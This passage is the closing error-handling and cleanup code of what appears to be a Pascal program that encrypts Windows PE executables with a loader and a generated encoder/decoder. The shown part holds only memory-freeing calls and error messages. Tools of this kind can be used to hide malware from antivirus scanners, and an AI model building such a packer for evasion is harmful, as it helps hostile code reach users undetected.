          MyFree(TlsCopy.Callbacks);
         end;
         MyFree(Key);

         if ImportSectionData<>nil then MyFree(ImportSectionData);
        end else ErrorMsg('Unable to allocate memory for encryption key.');
        MyFree(LoaderData);
       end else ErrorMsg('Unable to allocate memory for loader.');
      end else ErrorMsg('Unable to generate encoder/decoder'); 
     end else ErrorMsg('Unsupported Subsystem.');
    end else ErrorMsg('InputFile is not valid PE file.');
   end else ErrorMsg('Unable to read file.');
   MyFree(MainData);
  end else ErrorMsg('Unable to allocate memory for InputFile data.');
  if MainFile<>INVALID_HANDLE_VALUE then CloseHandle(MainFile);
 end else ErrorMsg('Unable to open file.');
end.
